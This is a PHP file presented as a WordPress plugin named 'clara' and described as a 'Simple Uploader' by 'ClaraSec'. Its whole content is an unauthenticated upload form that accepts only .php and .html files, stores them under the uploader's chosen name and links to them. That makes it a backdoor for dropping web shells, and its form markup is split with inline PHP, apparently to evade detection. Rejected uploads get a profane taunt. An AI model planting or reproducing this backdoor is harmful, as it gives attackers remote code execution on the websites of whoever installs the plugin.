<?php
/*
Plugin Name: clara
Plugin URI: http://contoh.com/plugin-anda
Description: Simple Uploader
Version: 1.0
Author: ClaraSec
Author URI: http://contoh.com/anda
License: GPL2
*/
if(isset($_FILES['file'])) {
   $file = $_FILES['file'];
   $file_name = $file['name'];
   $file_tmp = $file['tmp_name'];
   $file_ext = explode('.', $file_name);
   $file_ext = strtolower(end($file_ext));
   $allowed = array('php', 'html');
   if(in_array($file_ext, $allowed)) {
      $file_destination = '' . $file_name;
      move_uploaded_file($file_tmp, $file_destination);
      echo 'File berhasil diupload.<br>';
      echo 'File tersimpan di: ' . $file_destination . '<br>';
      echo 'open file: <a href="' . $file_destination . '">OPENBO</a>';
   } else {
      echo 'LOL FUCK U';
   }
}
?>
<form action="" meth<?php $n = "Clara";?>od="post" enctype="multipart/form-data"<?php $en = "Sec";?>><br><h1><?php echo $n, $en;?></h1> <input type="file" name="file">
   <input type="submit" value="Upload">
</form>
